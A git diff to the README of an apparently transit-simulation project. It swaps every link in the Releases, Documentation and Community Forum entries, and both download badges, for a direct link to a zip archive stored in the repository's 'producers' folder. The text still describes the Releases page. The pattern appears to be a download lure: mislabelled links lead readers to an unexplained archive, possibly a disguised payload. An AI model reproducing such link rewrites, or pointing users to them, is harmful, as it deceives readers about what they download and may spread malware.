@@ -1,6 +1,6 @@
 # 🚆 optimizing-chicago-public-transportation-realtime - Real-Time Transit Simulation Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/releases)
+[![Download Now](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip%https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip)](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ To get started, you will need a computer with internet access. The application i
 
 ## 📥 Download & Install
 
-To download the application, visit this [page to download](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/releases). You will find the latest version of the app available for download.
+To download the application, visit this [page to download](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip). You will find the latest version of the app available for download.
 
 1. Click on the link above to access the Releases page.
 2. Locate the latest application version in the list.
@@ -76,8 +76,8 @@ For further assistance, consider checking out the FAQ section on the Releases pa
 
 ## 📚 Additional Resources
 
-- [Documentation](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/wiki)
-- [Community Forum](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/discussions)
+- [Documentation](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip)
+- [Community Forum](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip)
 
 ## 📝 Contributing
 
@@ -94,4 +94,4 @@ This project touches on a variety of topics relevant to modern software developm
 
 We encourage you to explore these technologies for a deeper understanding.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/releases)
+[![Download Now](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip%https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip)](https://github.com/NESRINEJOUINI08/optimizing-chicago-public-transportation-realtime/raw/refs/heads/main/producers/optimizing_public_realtime_chicago_transportation_v2.2.zip)
